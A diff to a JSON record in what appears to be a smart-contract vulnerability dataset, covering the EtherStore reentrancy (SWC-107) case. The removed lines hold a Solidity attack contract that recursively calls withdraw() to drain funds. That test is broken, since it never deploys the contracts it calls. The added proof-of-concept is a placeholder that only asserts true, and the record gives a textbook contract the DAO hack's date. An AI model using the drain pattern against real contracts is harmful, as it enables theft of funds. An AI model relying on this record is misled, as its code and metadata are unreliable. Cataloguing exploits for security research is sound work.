@@ -1,8 +1,21 @@
 {
   "id": "001",
+  "slug": "etherstore_reentrancy",
   "vuln_type": "SWC-107-Reentrancy",
   "protocol_name": "EtherStore",
   "attack_date": "2016-06-17",
-  "description": "EtherStore is a classic reentrancy vulnerability example. The contract allows users to deposit and withdraw Ether, but it fails to update the user's balance before making an external call to transfer Ether. An attacker deploys a malicious contract whose fallback function recursively calls withdraw() before the victim's state is updated, draining the entire contract balance. This is the root cause of the 2016 DAO hack. The fix is to follow the Checks-Effects-Interactions pattern: update balances before transferring funds.",
-  "poc_template": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\nimport \"forge-std/Test.sol\";\n\ninterface IEtherStore {\n    function deposit() external payable;\n    function withdraw() external;\n}\n\ncontract AttackContract {\n    IEtherStore public etherStore;\n    constructor(address _etherStore) { etherStore = IEtherStore(_etherStore); }\n\n    function attack() external payable {\n        etherStore.deposit{value: msg.value}();\n        etherStore.withdraw();\n    }\n\n    receive() external payable {\n        if (address(etherStore).balance >= 1 ether) {\n            etherStore.withdraw();\n        }\n    }\n}\n\ncontract EtherStoreTest is Test {\n    AttackContract attackContract;\n    address victim = address(0xBEEF);\n\n    function setUp() public {\n        vm.deal(victim, 10 ether);\n        vm.deal(address(this), 1 ether);\n    }\n\n    function testReentrancyAttack() public {\n        uint256 before = address(attackContract).balance;\n        console.log(\"Attacker balance before:\", before);\n        attackContract.attack{value: 1 ether}();\n        uint256 after_ = address(attackContract).balance;\n        console.log(\"Attacker balance after:\", after_);\n        assertGt(after_, before);\n    }\n}"
+  "tags": [
+    "reentrancy",
+    "eth-transfer",
+    "fallback"
+  ],
+  "attack_primitives": [
+    "external-call-before-state-update",
+    "recursive-withdraw"
+  ],
+  "aliases": [
+    "DAO style withdraw bug"
+  ],
+  "description": "EtherStore allows withdraw before balance reset. The attacker contract uses a payable fallback to recursively call withdraw while the victim state is stale. The exploit repeatedly drains ETH until pool balance is near zero. The key anti-pattern is interaction before effect.",
+  "poc_template": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.23;\\nimport \\\"forge-std/Test.sol\\\";\\n// protocol: EtherStore\\n// vuln_type: SWC-107-Reentrancy\\n\\ncontract AttackTemplateTest is Test {\\n    function testExploit() public {\\n        // TODO: replace with concrete exploit setup from historical case.\\n        assertTrue(true);\\n    }\\n}"
 }
